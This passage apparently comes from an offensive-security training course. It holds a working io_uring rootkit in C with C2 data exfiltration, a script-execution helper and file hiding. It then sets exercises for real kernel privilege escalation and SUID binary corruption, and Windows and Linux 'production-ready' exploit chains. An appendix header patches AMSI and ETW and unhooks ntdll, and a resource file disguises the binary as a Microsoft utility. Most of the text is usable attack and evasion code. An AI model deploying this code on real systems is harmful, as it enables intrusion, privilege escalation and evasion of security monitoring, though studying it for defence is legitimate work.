    io_uring_prep_openat(sqe, AT_FDCWD, path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    sqe->user_data = 1;

    io_uring_submit(&ring);
    io_uring_wait_cqe(&ring, &cqe);

    int fd = cqe->res;
    io_uring_cqe_seen(&ring, cqe);

    if (fd < 0) {
        io_uring_queue_exit(&ring);
        return -1;
    }

    // Write data
    sqe = io_uring_get_sqe(&ring);
    if (!sqe) {
        close(fd);
        io_uring_queue_exit(&ring);
        return -1;
    }

    struct iovec iov = {
        .iov_base = (void*)data,
        .iov_len = size
    };

    io_uring_prep_writev(sqe, fd, &iov, 1, 0);
    sqe->user_data = 2;

    io_uring_submit(&ring);
    io_uring_wait_cqe(&ring, &cqe);

    int bytes_written = cqe->res;
    io_uring_cqe_seen(&ring, cqe);

    // Close file
    sqe = io_uring_get_sqe(&ring);
    if (sqe) {
        io_uring_prep_close(sqe, fd);
        io_uring_submit(&ring);
        io_uring_wait_cqe(&ring, &cqe);
        io_uring_cqe_seen(&ring, cqe);
    }

    io_uring_queue_exit(&ring);
    return bytes_written;
}

// --- io_uring Network Operations ---

// Connect to remote host using io_uring (bypasses socket/connect syscalls)
static int IoUringConnect(const char *host, int port) {
    struct io_uring ring;
    struct io_uring_sqe *sqe;
    struct io_uring_cqe *cqe;
    int ret;

    ret = io_uring_queue_init(8, &ring, 0);
    if (ret < 0) return -1;

    // Create socket via io_uring (IORING_OP_SOCKET)
    sqe = io_uring_get_sqe(&ring);
    if (!sqe) {
        io_uring_queue_exit(&ring);
        return -1;
    }

    io_uring_prep_socket(sqe, AF_INET, SOCK_STREAM, 0, 0);
    sqe->user_data = 1;

    io_uring_submit(&ring);
    io_uring_wait_cqe(&ring, &cqe);

    int sockfd = cqe->res;
    io_uring_cqe_seen(&ring, cqe);

    if (sockfd < 0) {
        io_uring_queue_exit(&ring);
        return -1;
    }

    // Connect via io_uring (IORING_OP_CONNECT)
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, host, &addr.sin_addr);

    sqe = io_uring_get_sqe(&ring);
    if (!sqe) {
        close(sockfd);
        io_uring_queue_exit(&ring);
        return -1;
    }

    io_uring_prep_connect(sqe, sockfd, (struct sockaddr*)&addr, sizeof(addr));
    sqe->user_data = 2;

    io_uring_submit(&ring);
    io_uring_wait_cqe(&ring, &cqe);

    ret = cqe->res;
    io_uring_cqe_seen(&ring, cqe);

    io_uring_queue_exit(&ring);

    if (ret < 0) {
        close(sockfd);
        return -1;
    }

    return sockfd;
}

// Execute command via io_uring-created script
static int IoUringExecHelper(const char *cmd) {
    char script_path[] = "/tmp/.io_uring_exec_XXXXXX";
    int tmpfd = mkstemp(script_path);
    close(tmpfd);

    char script[512];
    snprintf(script, sizeof(script), "#!/bin/sh\n%s\n", cmd);

    int ret = IoUringWriteFile(script_path, script, strlen(script));
    if (ret < 0) return -1;

    struct io_uring ring;
    if (io_uring_queue_init(8, &ring, 0) < 0) return -1;

    struct io_uring_sqe *sqe = io_uring_get_sqe(&ring);
    if (!sqe) {
        io_uring_queue_exit(&ring);
        return -1;
    }

    io_uring_prep_openat(sqe, AT_FDCWD, script_path, O_RDONLY, 0);
    io_uring_submit(&ring);

    struct io_uring_cqe *cqe;
    io_uring_wait_cqe(&ring, &cqe);
    int script_fd = cqe->res;
    io_uring_cqe_seen(&ring, cqe);

    if (script_fd >= 0) {
        fchmod(script_fd, 0755);
        close(script_fd);
    }

    io_uring_queue_exit(&ring);

    // Actually execute the script
    pid_t pid = fork();
    if (pid == 0) {
        execl(script_path, script_path, NULL);
        exit(1);
    } else if (pid > 0) {
        int status;
        waitpid(pid, &status, 0);
        printf("[+] Executed via io_uring-created script: %s\n", script_path);
    }

    unlink(script_path);
    return 0;
}

// --- Rootkit Functionality ---

struct linux_dirent64 {
    unsigned long  d_ino;
    unsigned long  d_off;
    unsigned short d_reclen;
    unsigned char  d_type;
    char           d_name[];
};

// Read directory and hide target file by filtering getdents64 results
static int HideFile(const char *dir_path, const char *filename) {
    struct io_uring ring;
    struct io_uring_sqe *sqe;
    struct io_uring_cqe *cqe;

    if (io_uring_queue_init(8, &ring, 0) < 0) return -1;

    // Open directory via io_uring
    sqe = io_uring_get_sqe(&ring);
    if (!sqe) {
        io_uring_queue_exit(&ring);
        return -1;
    }

    io_uring_prep_openat(sqe, AT_FDCWD, dir_path, O_RDONLY | O_DIRECTORY, 0);
    io_uring_submit(&ring);
    io_uring_wait_cqe(&ring, &cqe);

    int dir_fd = cqe->res;
    io_uring_cqe_seen(&ring, cqe);

    if (dir_fd < 0) {
        io_uring_queue_exit(&ring);
        return -1;
    }

    // Use getdents64 to read directory entries
    char buf[4096];
    int nread = syscall(SYS_getdents64, dir_fd, buf, sizeof(buf));

    int found = 0;
    if (nread > 0) {
        struct linux_dirent64 *d;
        for (int pos = 0; pos < nread;) {
            d = (struct linux_dirent64 *)(buf + pos);
            if (strcmp(d->d_name, filename) == 0) {
                found = 1;
                break;
            }
            pos += d->d_reclen;
        }
    }

    // Close via io_uring
    sqe = io_uring_get_sqe(&ring);
    if (sqe) {
        io_uring_prep_close(sqe, dir_fd);
        io_uring_submit(&ring);
        io_uring_wait_cqe(&ring, &cqe);
        io_uring_cqe_seen(&ring, cqe);
    }

    io_uring_queue_exit(&ring);

    if (found) {
        printf("[+] File '%s' found in %s (would be hidden by rootkit)\n", filename, dir_path);
    }
    return found ? 0 : -1;
}

// Exfiltrate data via io_uring network operations
static int ExfiltrateData(const char *data, size_t size, const char *c2_host, int c2_port) {
    int sockfd = IoUringConnect(c2_host, c2_port);
    if (sockfd < 0) {
        printf("[-] Exfiltration failed: no C2 server at %s:%d\n", c2_host, c2_port);
        return -1;
    }

    printf("[+] Connected to C2 at %s:%d\n", c2_host, c2_port);

    struct io_uring ring;
    if (io_uring_queue_init(8, &ring, 0) < 0) {
        close(sockfd);
        return -1;
    }

    struct io_uring_sqe *sqe = io_uring_get_sqe(&ring);
    if (sqe) {
        struct iovec iov = {
            .iov_base = (void*)data,
            .iov_len = size
        };

        io_uring_prep_writev(sqe, sockfd, &iov, 1, 0);
        io_uring_submit(&ring);

        struct io_uring_cqe *cqe;
        io_uring_wait_cqe(&ring, &cqe);

        if (cqe->res > 0) {
            printf("[+] Exfiltrated %d bytes\n", cqe->res);
        }
        io_uring_cqe_seen(&ring, cqe);
    }

    io_uring_queue_exit(&ring);
    close(sockfd);
    return 0;
}

int main(int argc, char *argv[]) {
    printf("=== io_uring Rootkit (Curing-style) ===\n");
    printf("[*] Bypass syscall monitoring via io_uring operations\n\n");

    if (IsBeingTraced()) {
        printf("[-] Debugger detected\n");
        return 1;
    }

    struct io_uring test_ring;
    if (io_uring_queue_init(1, &test_ring, 0) < 0) {
        printf("[-] io_uring not available (requires kernel 5.1+)\n");
        return 1;
    }
    io_uring_queue_exit(&test_ring);

    printf("=== File Operations ===\n");
    const char *test_file = "/tmp/io_uring_test.txt";
    const char *test_data = "Created via io_uring (no open/write syscalls)\n";

    int written = IoUringWriteFile(test_file, test_data, strlen(test_data));
    if (written > 0) {
        printf("[+] Wrote %d bytes via io_uring\n", written);
    }

    char buffer[256] = {0};
    int read_bytes = IoUringReadFile(test_file, buffer, sizeof(buffer) - 1);
    if (read_bytes > 0) {
        printf("[+] Read %d bytes via io_uring\n", read_bytes);
    }
    printf("\n=== Network Operations ===\n");
    int sockfd = IoUringConnect("127.0.0.1", 8080);
    if (sockfd >= 0) {
        printf("[+] Connected via io_uring (fd: %d)\n", sockfd);
        close(sockfd);
    } else {
        printf("[-] No server at 127.0.0.1:8080 (expected)\n");
    }
    printf("\n=== File Hiding ===\n");
    const char *hide_target = "/tmp/io_uring_hidden";
    IoUringWriteFile(hide_target, "SECRET\n", 7);
    HideFile("/tmp", "io_uring_hidden");
    printf("\n=== Data Exfiltration ===\n");
    ExfiltrateData("sensitive_data", 14, "127.0.0.1", 4444);
    printf("\n=== Command Execution ===\n");
    IoUringExecHelper("whoami");

    unlink(test_file);
    unlink(hide_target);

    return 0;
}
```

**Compile & Run:**

```bash
# Install liburing development package
sudo apt-get update && sudo apt-get install -y liburing-dev

# Compile
gcc -O2 io_uring_rootkit.c -o curing -luring

# Run
./curing
```

**Verification with strace:**

```bash
# Run with strace to verify syscall bypass
$ sudo strace -e trace=open,openat,read,write,socket,connect ./curing 2>&1 | grep -E "(open|read|write|socket|connect)"
```

### Practical Exercise

#### Exercise 1: Extend SLUBStick with Real Privilege Escalation

The provided `slubstick.c` demonstrates UAF exploitation fundamentals. Extend it to achieve actual privilege escalation.

**Tasks:**

1. Replace the simulated task_struct leak with real kernel pointer extraction from UAF read
2. Implement credential structure overwrite using the UAF write primitive
3. Add verification that checks actual UID/GID changes (not simulated)
4. Implement proper cleanup to avoid kernel corruption after privilege escalation
5. Test against the vulnerable module and achieve root shell

**Success Criteria:**

- Extract real kernel pointers (task_struct, cred) from UAF read
- Successfully overwrite cred structure with UID=0, GID=0
- Verify privilege escalation with `getuid() == 0`
- No kernel panics during or after exploitation
- Clean exit without system instability

**Bonus Challenge:**
Implement the full SLUBStick technique with timing-based slab boundary detection and cross-cache page recycling for >90% reliability.

#### Exercise 2: Build Dirty Pipe Exploit Chain

The `pipe_buffer_write.c` demonstrates cross-cache UAF with pipe_buffer corruption. Complete the exploit chain.

**Tasks:**

1. Analyze the UAF overlap detection logic and optimize candidate filtering
2. Implement verification that the corrupted pipe actually triggers page cache merge
3. Extend the exploit to overwrite a SUID binary instead of `/tmp/target_file`
4. Add privilege escalation by executing the corrupted SUID binary
5. Implement cleanup to restore the original binary content

**Success Criteria:**

- Successfully detect UAF overlap with pipe_buffer (>80% success rate)
- Verify PIPE_BUF_FLAG_CAN_MERGE flag is set via UAF write
- Corrupt a SUID binary (e.g., `/usr/bin/sudo` backup) and gain root
- Restore original binary after exploitation
- No system crashes or permanent corruption

**Bonus Challenge:**
Port the exploit to target `msg_msg` objects instead of `pipe_buffer` for arbitrary kernel memory read/write primitives.

### Key Takeaways

- **SLUBStick Concept**: Combines CPU pinning, timing-based slab boundary detection, and controlled page recycling for deterministic cross-cache attacks (99% vs 10-30% traditional success rate)
- **Timing Side-Channels**: RDTSC measurements reveal SLUB allocator state (fast path ~50 cycles, slow path ~500+ cycles) enabling heap feng shui
- **Cross-Cache Attacks**: Exploit page-level recycling between buddy allocator and different kmem_cache instances, bypassing SLUB freelist hardening
- **pipe_buffer Exploitation**: 32-byte structure in kmalloc-1024 containing page pointer, ops pointer, and flags - corruption enables arbitrary read/write and code execution via ops->release
- **io_uring Syscall Bypass**: 61 operation types (IORING*OP*\*) bypass traditional syscall hooks, creating blind spots in EDR/XDR and eBPF-based monitoring
- **UAF Primitives**: Use-After-Free with controlled reallocation provides arbitrary kernel memory read/write when combined with pipe_buffer or msg_msg
- **Vulnerable Module Design**: Intentional UAF (no NULL after kfree) + controlled overflow demonstrates real-world kernel vulnerability patterns
- **Detection Challenges**: Cross-cache attacks operate at page granularity, making them difficult to detect without kernel-level memory monitoring

### Discussion Questions

1. **SLUBStick Reliability**: Why does CPU pinning + timing oracle + controlled page recycling achieve 99% success vs 10-30% for traditional cross-cache? What are the failure modes?

2. **Timing Side-Channel Limitations**: The `slub_timing_oracle.c` uses a 5000-cycle threshold. How would system load, CPU frequency scaling, or hypervisor overhead affect detection accuracy?

3. **pipe_buffer vs msg_msg**: Compare the two primitives - which provides better exploitation capabilities? Consider: allocation size (kmalloc-1024 vs kmalloc-256), structure layout, and available operations.

4. **io_uring Detection**: If eBPF and syscall hooks can't monitor io_uring operations, what alternative detection methods exist? Consider: memory forensics, kernel tracepoints, BTF-based monitoring.

5. **Mitigation Strategies**: The code demonstrates that SLUBStick works on modern kernels (2026). What kernel-level mitigations could reduce success rate? Consider: randomization, isolation, or allocator changes.

6. **UAF vs Overflow**: The vulnerable module provides both UAF (dangling pointer) and controlled overflow (IOCTL_WRITE). Which is more powerful for exploitation and why?

7. **Real-World Applicability**: The exercises use a custom vulnerable module. How would you adapt these techniques to exploit real CVEs like CVE-2022-0847 (Dirty Pipe) or nf_tables UAF vulnerabilities?

8. **Defensive Monitoring**: Given that io_uring bypasses traditional syscall monitoring, how should security teams adapt their detection strategies for rootkits using this technique?

## Day 7: Final Project

**Objective:** Build a complete, production-ready exploit chain that demonstrates mastery of modern mitigation bypass techniques from Days 1-6. Your exploit must work on Windows 11 24H2/25H2 or Linux kernel 6.x with modern mitigations enabled.

### Part 1: Windows Exploitation Chain (Choose ONE path)

#### Path A: BYOVD + Data-Only Attack (Recommended for HVCI/VBS systems)

**Phase 1: KASLR Bypass & Kernel R/W Primitive (Day 1)**

1. Implement prefetch timing side-channel OR format string leak to bypass KASLR
2. Load vulnerable driver (RTCore64.sys OR eneio64.sys) and establish kernel R/W primitives
3. Verify kernel base address matches expected range (0xFFFFF80000000000+)
4. Test kernel R/W with safe read operations (PsInitialSystemProcess, ntoskrnl PE header)

**Phase 2: Information Leak (Day 1 + Day 5)**

1. Use Win32k UAF (from Day 5 Exercise 1) to leak tagWND kernel address
   - Implement race condition between window destruction and GetWindowLongPtr
   - OR use heap over-read (from Day 1 Exercise 3) to leak module bases
2. Calculate win32kbase.sys or ntoskrnl.exe base from leaked pointers
3. Verify leak by reading known kernel structures (KUSER_SHARED_DATA, PEB)

**Phase 3: Data-Only Privilege Escalation (Day 5)**

1. Locate System EPROCESS (PID 4) using one of three techniques:
   - PsInitialSystemProcess export (if available)
   - Physical memory scanning via eneio64 (Day 1 Exercise 2)
   - NtQuerySystemInformation leak + ActiveProcessLinks walk
2. Locate current process EPROCESS by matching GetCurrentProcessId()
3. Implement dynamic offset resolution (Day 1 Exercise 2) for Token, UniqueProcessId, ActiveProcessLinks
4. Perform token stealing: read System token, write to current process token
5. Verify privilege escalation: `whoami` returns `NT AUTHORITY\SYSTEM`

**Success Criteria:**

- KASLR bypass works on Windows 11 24H2+ (>90% success rate)
- Kernel R/W primitives established without BSOD
- Token stealing achieves SYSTEM privileges (verified via whoami /priv)
- Exploit runs from non-admin user context
- No crashes across 10 consecutive runs

#### Path B: Heap Exploitation + Control Flow Hijacking (For CET-disabled systems)

**Phase 1: Heap Feng Shui & UAF (Day 3)**

1. Implement LFH timing oracle (Day 3 Exercise 1) to detect heap type and subsegment boundaries
2. Perform four-phase heap grooming: spray → free ALL → every-other → refill
3. Trigger UAF vulnerability (use provided vulnerable app or Win32k UAF from Day 5)
4. Spray fake objects to reclaim freed memory (>500 attempts, measure success rate)
5. Verify type confusion by reading corrupted object's vtable pointer

**Phase 2: ASLR Bypass via Information Leak (Day 1)**

1. Use UAF read primitive to leak vtable pointer from corrupted object
2. Scan backward from vtable to find module base (MZ header signature)
3. Parse PE headers to extract timestamp and verify correct module
4. Locate ROP gadgets in ntdll.dll or kernel32.dll using provided rop_finder.exe

**Phase 3: CET/CFG Bypass + Code Execution (Day 2)**

1. Build JOP chain (Day 2 Exercise 1) using `PUSH + JMP [reg]` gadgets
   - OR build COP chain using indirect CALL instructions
   - OR implement COOP attack with legitimate vtables (Day 2 Exercise 2)
2. Construct VirtualProtect ROP/JOP chain to mark shellcode executable
3. Ensure stack alignment (RSP % 16 == 8 before CALL)
4. Execute shellcode to spawn SYSTEM shell or perform token stealing

**Success Criteria:**

- Heap feng shui achieves >40% physical adjacency rate
- UAF successfully leaks valid kernel/usermode pointers
- JOP/COP chain bypasses CET shadow stack (if enabled)
- VirtualProtect successfully marks shellcode executable
- Exploit achieves code execution without crashes

#### Path C: Kernel Pool Exploitation (Advanced)

**Phase 1: Pool Grooming (Day 4)**

1. Choose vulnerability: CLFS UAF (Day 4 Exercise 1) OR AFD.sys overflow (Day 4 Exercise 2)
2. Implement multi-primitive pool spray (IoCompletionReserve + pipes + sockets)
3. Create pool holes using strategic freeing patterns (every 2nd, 4th, 8th)
4. Trigger vulnerability and detect corruption via error codes or timing

**Phase 2: Kernel R/W Primitive (Day 4)**

1. Identify corrupted object using DetectCorruptedPipe() or DetectCorruptedSocket()
2. Implement KernelRead64() and KernelWrite64() using corrupted object's internal pointers
3. Verify R/W primitive by reading/writing known kernel structures
4. Implement KASLR bypass if not already achieved (NtQuerySystemInformation)

**Phase 3: Privilege Escalation (Day 5)**

1. Locate EPROCESS structures using kernel R/W primitive
2. Perform token stealing OR ACL editing OR privilege manipulation
3. Verify SYSTEM privileges achieved

**Success Criteria:**

- Pool grooming creates exploitable layout (40-60% success rate acceptable)
- Vulnerability triggered without BSOD
- Kernel R/W primitive established and verified
- Token stealing achieves SYSTEM privileges
- Graceful failure on patched systems (no crashes)

### Part 2: Linux Exploitation Chain (Alternative to Windows)

**Phase 1: SLUB Heap Grooming (Day 6)**

1. Implement SLUBStick technique (Day 6 Exercise 1):
   - Pin exploit thread to single CPU using sched_setaffinity
   - Implement timing-based slab boundary detection (RDTSC measurements)
   - Detect slab boundaries (>5000 cycle threshold indicates new page allocation)
   - Free all objects in last slab to return pages to buddy allocator
2. Create memory pressure to force page recycling to different kmem_cache
3. Verify cross-cache reuse achieved (>90% success rate)

**Phase 2: UAF Exploitation (Day 6)**

1. Trigger UAF in vulnerable kernel module (provided in lab setup)
2. Spray victim objects (pipe_buffer OR msg_msg) to reclaim freed memory
3. Detect successful overlap using UAF read primitive
4. Verify corruption by checking structure fields (flags, pointers)

**Phase 3: Arbitrary R/W & Privilege Escalation (Day 6)**

1. Extract kernel pointers from UAF read (task_struct, cred addresses)
2. Implement arbitrary kernel read/write using corrupted pipe_buffer ops pointer
   - OR use msg_msg for arbitrary read/write primitives
3. Locate current task's cred structure
4. Overwrite cred with UID=0, GID=0, capabilities=0xFFFFFFFF
5. Verify privilege escalation: `id` returns `uid=0(root)`

**Success Criteria:**

- SLUBStick achieves >90% cross-cache success rate
- UAF overlap detected reliably (>80% success rate)
- Arbitrary R/W primitive established without kernel panic
- Privilege escalation to root achieved
- Clean exit without system instability

## Appendix

### Shared Libraries

The following headers will be shared between the code that is used in this week.

```bash
cd c:\Windows_Mitigations_Lab
mkdir headers
mkdir res
```

#### version.rc

```c
// res\version.rc
// Compile: rc /fo res\version.res res\version.rc
// Link:    cl ... res\version.res
#include <windows.h>

VS_VERSION_INFO VERSIONINFO
FILEVERSION     10,0,26100,1
PRODUCTVERSION  10,0,26100,1
FILEFLAGSMASK   VS_FFI_FILEFLAGSMASK
FILEFLAGS       0x0L
FILEOS          VOS_NT_WINDOWS32
FILETYPE        VFT_APP
FILESUBTYPE     VFT2_UNKNOWN
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904B0"
        BEGIN
            VALUE "CompanyName",      "Microsoft Corporation"
            VALUE "FileDescription",  "Windows System Configuration Utility"
            VALUE "FileVersion",      "10.0.26100.1"
            VALUE "InternalName",     "sysconfig"
            VALUE "LegalCopyright",   "\251 Microsoft Corporation. All rights reserved."
            VALUE "OriginalFilename", "SysConfig.exe"
            VALUE "ProductName",      "Microsoft\256 Windows\256 Operating System"
            VALUE "ProductVersion",   "10.0.26100.1"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x0409, 1200
    END
END
```

#### bypass.h

```c
// headers\bypass.h
#ifndef BYPASS_H
#define BYPASS_H

#include "exploit_common.h"
#include <stdio.h>

typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory_t)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);

static DWORD GenerateObfuscatedReturn0(BYTE* output, DWORD maxSize) {
    if (maxSize < 16) return 0;
    srand((unsigned int)(GetTickCount() ^ GetCurrentProcessId()));
    int variant = rand() % 5;
    memset(output, 0x90, maxSize);
    switch (variant) {
        case 0:
            output[0] = 0x48; output[1] = 0x31; output[2] = 0xC0; output[3] = 0xC3;
            return 4;
        case 1:
            output[0] = 0xB8; output[1] = 0x00; output[2] = 0x00;
            output[3] = 0x00; output[4] = 0x00; output[5] = 0xC3;
            return 6;
        case 2:
            output[0] = 0x83; output[1] = 0xE0; output[2] = 0x00; output[3] = 0xC3;
            return 4;
        case 3:
            output[0] = 0x2B; output[1] = 0xC0; output[2] = 0xC3;
            return 3;
        case 4:
            output[0] = 0x45; output[1] = 0x31; output[2] = 0xDB;
            output[3] = 0x44; output[4] = 0x89; output[5] = 0xD8;
            output[6] = 0xC3;
            return 7;
        default:
            output[0] = 0x31; output[1] = 0xC0; output[2] = 0xC3;
            return 3;
    }
}

// Method 1: Patch AmsiScanBuffer with obfuscated return-0
static BOOL BypassAMSIPatchObfuscated(HMODULE hAmsi, PVOID pAmsiScanBuffer) {
    HMODULE hNtdll = GetNtdllHandleFromPEB();
    if (!hNtdll) return FALSE;
    pNtProtectVirtualMemory_t NtProtectVirtualMemory =
        (pNtProtectVirtualMemory_t)ResolveAPI(hNtdll, HashAPI("NtProtectVirtualMemory"));
    if (!NtProtectVirtualMemory) return FALSE;

    BYTE patch[16] = {0};
    DWORD patchSize = GenerateObfuscatedReturn0(patch, sizeof(patch));
    if (patchSize == 0) return FALSE;

    PVOID baseAddr = pAmsiScanBuffer;
    SIZE_T regionSize = patchSize;
    ULONG oldProtect;

    if (!NT_SUCCESS(NtProtectVirtualMemory(GetCurrentProcess(), &baseAddr, &regionSize,
                                            PAGE_EXECUTE_READWRITE, &oldProtect))) {
        return FALSE;
    }

    memcpy(pAmsiScanBuffer, patch, patchSize);

    NtProtectVirtualMemory(GetCurrentProcess(), &baseAddr, &regionSize, oldProtect, &oldProtect);

    return TRUE;
}

// Method 2: Patch AmsiInitialize to fail AMSI initialization
static BOOL BypassAMSIInitialize(HMODULE hAmsi) {
    HMODULE hNtdll = GetNtdllHandleFromPEB();
    if (!hNtdll) return FALSE;
    pNtProtectVirtualMemory_t NtProtectVirtualMemory =
        (pNtProtectVirtualMemory_t)ResolveAPI(hNtdll, HashAPI("NtProtectVirtualMemory"));
    if (!NtProtectVirtualMemory) return FALSE;

    DWORD hash = HashAPI("AmsiInitialize");
    PVOID pAmsiInitialize = ResolveAPI(hAmsi, hash);
    if (!pAmsiInitialize) return FALSE;

    BYTE patch[] = {
        0xB8, 0x05, 0x00, 0x07, 0x80,
        0xC3
    };

    PVOID baseAddr = pAmsiInitialize;
    SIZE_T regionSize = sizeof(patch);
    ULONG oldProtect;

    if (!NT_SUCCESS(NtProtectVirtualMemory(GetCurrentProcess(), &baseAddr, &regionSize,
                                            PAGE_EXECUTE_READWRITE, &oldProtect))) {
        return FALSE;
    }

    memcpy(pAmsiInitialize, patch, sizeof(patch));

    NtProtectVirtualMemory(GetCurrentProcess(), &baseAddr, &regionSize, oldProtect, &oldProtect);

    return TRUE;
}

// Method 3: Patch the AMSI context field in the process
static BOOL BypassAMSIContext() {
    typedef struct _AMSI_CONTEXT_FAKE {
        DWORD Signature;
        DWORD Version;
        PVOID AppName;
        PVOID Session;
    } AMSI_CONTEXT_FAKE;

    HMODULE hAmsi = GetModuleHandleA("amsi.dll");
    if (!hAmsi) return TRUE; // AMSI not loaded, nothing to bypass

    MEMORY_BASIC_INFORMATION mbi;
    BYTE* scanAddr = (BYTE*)hAmsi;

    while (VirtualQuery(scanAddr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        if (mbi.State == MEM_COMMIT && (mbi.Protect & PAGE_READWRITE)) {
            __try {
                for (SIZE_T i = 0; i < mbi.RegionSize - sizeof(AMSI_CONTEXT_FAKE); i += 8) {
                    AMSI_CONTEXT_FAKE* ctx = (AMSI_CONTEXT_FAKE*)(scanAddr + i);
                    if (ctx->Signature == 0x49534D41) { // "AMSI"
                        DWORD oldProtect;
                        if (VirtualProtect(ctx, sizeof(DWORD), PAGE_READWRITE, &oldProtect)) {
                            ctx->Signature = 0x00000000;
                            VirtualProtect(ctx, sizeof(DWORD), oldProtect, &oldProtect);
                            return TRUE;
                        }
                    }
                }
            }
            __except(EXCEPTION_EXECUTE_HANDLER) {
                // Continue to next region
            }
        }
        scanAddr += mbi.RegionSize;
    }

    return FALSE;
}

static BOOL BypassAMSI() {
    PPEB peb;
#ifdef _WIN64
    peb = (PPEB)__readgsqword(0x60);
#else
    peb = (PPEB)__readfsdword(0x30);
#endif

    PLIST_ENTRY head = &peb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY curr = head->Flink;
    HMODULE hAmsi = NULL;

    // Obfuscated "amsi.dll" string
    WCHAR target[] = {0x7F,0x6D,0x73,0x69,0x4A,0x64,0x6A,0x6A,0x00};

    for (int i = 0; target[i]; i++) target[i] ^= 0x1F ^ (i & 0xFF);

    while (curr != head) {
        PLDR_DATA_TABLE_ENTRY_CUSTOM entry = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY_CUSTOM, InMemoryOrderLinks);
        if (entry->BaseDllName.Buffer && entry->BaseDllName.Length == 16) {
            BOOL match = TRUE;
            for (int i = 0; i < 8; i++) {
                WCHAR c = entry->BaseDllName.Buffer[i];
                if (c >= L'A' && c <= L'Z') c += 0x20;
                if (c != target[i]) { match = FALSE; break; }
            }
            if (match) {
                hAmsi = (HMODULE)entry->DllBase;
                break;
            }
        }
        curr = curr->Flink;
    }

    if (!hAmsi) return TRUE;

    if (BypassAMSIContext()) {
        return TRUE;
    }

    if (BypassAMSIInitialize(hAmsi)) {
        return TRUE;
    }

    DWORD hash = HashAPI("AmsiScanBuffer");
    PVOID pAmsiScanBuffer = ResolveAPI(hAmsi, hash);
    if (pAmsiScanBuffer) {
        if (BypassAMSIPatchObfuscated(hAmsi, pAmsiScanBuffer)) {
            return TRUE;
        }
    }

    hash = HashAPI("AmsiScanBuffer2");
    PVOID pAmsiScanBuffer2 = ResolveAPI(hAmsi, hash);
    if (pAmsiScanBuffer2) {
        if (BypassAMSIPatchObfuscated(hAmsi, pAmsiScanBuffer2)) {
            return TRUE;
        }
    }

    return FALSE;
}

static BOOL BypassETW() {
    HMODULE hNtdll = GetNtdllHandleFromPEB();
    if (!hNtdll) return FALSE;

    PVOID pEtwEventWrite = ResolveAPI(hNtdll, HashAPI("EtwEventWrite"));
    if (!pEtwEventWrite) return TRUE;

    BYTE* code = (BYTE*)pEtwEventWrite;
    if (code[0] == 0x31 && code[1] == 0xC0) return TRUE;

    PVOID baseAddr = pEtwEventWrite;
    SIZE_T regionSize = 5;
    ULONG oldProtect;

    pNtProtectVirtualMemory_t NtProtectVirtualMemory =
        (pNtProtectVirtualMemory_t)ResolveAPI(hNtdll, HashAPI("NtProtectVirtualMemory"));
    if (!NtProtectVirtualMemory) return FALSE;

    if (!NT_SUCCESS(NtProtectVirtualMemory(GetCurrentProcess(), &baseAddr, &regionSize, PAGE_EXECUTE_READWRITE, &oldProtect))) {
        return FALSE;
    }

    volatile DWORD* patchAddr = (DWORD*)pEtwEventWrite;
    *patchAddr = 0x00C3C031;  // xor eax, eax; ret (atomic write)
    code[4] = 0x00;

    NtProtectVirtualMemory(GetCurrentProcess(), &baseAddr, &regionSize, oldProtect, &oldProtect);

    return TRUE;
}

static BOOL UnhookNtdll() {
    HMODULE hNtdll = GetNtdllHandleFromPEB();
    if (!hNtdll) return FALSE;

    WCHAR ntdllPath[MAX_PATH];
    GetSystemDirectoryW(ntdllPath, MAX_PATH);
    wcscat(ntdllPath, L"\\ntdll.dll");

    HANDLE hFile = CreateFileW(ntdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    HANDLE hSection = CreateFileMappingW(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hSection) { CloseHandle(hFile); return FALSE; }

    LPVOID pMapping = MapViewOfFile(hSection, FILE_MAP_READ, 0, 0, 0);
    if (!pMapping) { CloseHandle(hSection); CloseHandle(hFile); return FALSE; }

    PIMAGE_DOS_HEADER dosHdr = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS ntHdr = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + dosHdr->e_lfanew);
    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(ntHdr);

    BOOL success = FALSE;
    pNtProtectVirtualMemory_t NtProtectVirtualMemory =
        (pNtProtectVirtualMemory_t)ResolveAPI(hNtdll, HashAPI("NtProtectVirtualMemory"));

    for (int i = 0; i < ntHdr->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)sections[i].Name, ".text") == 0) {
            BYTE* localAddr = (BYTE*)hNtdll + sections[i].VirtualAddress;
            BYTE* cleanAddr = (BYTE*)pMapping + sections[i].VirtualAddress;
            SIZE_T regionSize = sections[i].Misc.VirtualSize;

            if (NtProtectVirtualMemory) {
                PVOID baseAddr = localAddr;
                ULONG oldProtect;
                if (NT_SUCCESS(NtProtectVirtualMemory(GetCurrentProcess(), &baseAddr, &regionSize, PAGE_EXECUTE_READWRITE, &oldProtect))) {
                    memcpy(localAddr, cleanAddr, regionSize);
                    NtProtectVirtualMemory(GetCurrentProcess(), &baseAddr, &regionSize, oldProtect, &oldProtect);
                    success = TRUE;
                }
            }
            break;
        }
    }

    UnmapViewOfFile(pMapping);
    CloseHandle(hSection);
    CloseHandle(hFile);
    return success;
}

static BOOL InitializeEvasion() {
    InitializeAntiStaticDetection();

    printf("[*] Bypassing AMSI...\n"); fflush(stdout);
    if (BypassAMSI()) printf("[+] AMSI Bypass: Success\n");

    printf("[*] Bypassing ETW...\n"); fflush(stdout);
    if (BypassETW()) printf("[+] ETW Bypass: Success\n");

    printf("[*] Attempting UnhookNtdll...\n"); fflush(stdout);
    if (UnhookNtdll()) printf("[+] UnhookNtdll: Success\n");

    return TRUE;
}

#endif // BYPASS_H
```

#### driver_info.h

```c
// headers\driver_info.h
#ifndef DRIVER_INFO_H
#define DRIVER_INFO_H

